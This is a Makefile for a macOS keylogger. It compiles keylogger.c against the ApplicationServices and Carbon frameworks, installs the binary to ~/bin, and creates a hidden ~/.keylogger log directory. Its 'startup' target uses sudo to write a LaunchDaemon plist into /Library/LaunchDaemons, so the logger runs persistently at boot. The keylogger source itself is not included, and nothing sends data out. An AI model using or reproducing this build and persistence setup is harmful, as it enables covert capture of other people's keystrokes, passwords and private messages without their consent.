CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=keylogger
PLIST=keylogger.plist
INSTALLDIR=~/bin
LOGSPATH=~/.keylogger

compile: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install:
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)
	mkdir -p $(LOGSPATH)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup:
	sed "s|~|${HOME}/bin/keylogger ${HOME}/.keylogger|" keylogger.plist | sudo tee /Library/LaunchDaemons/keylogger.plist

clean:
	rm $(EXECUTABLE)
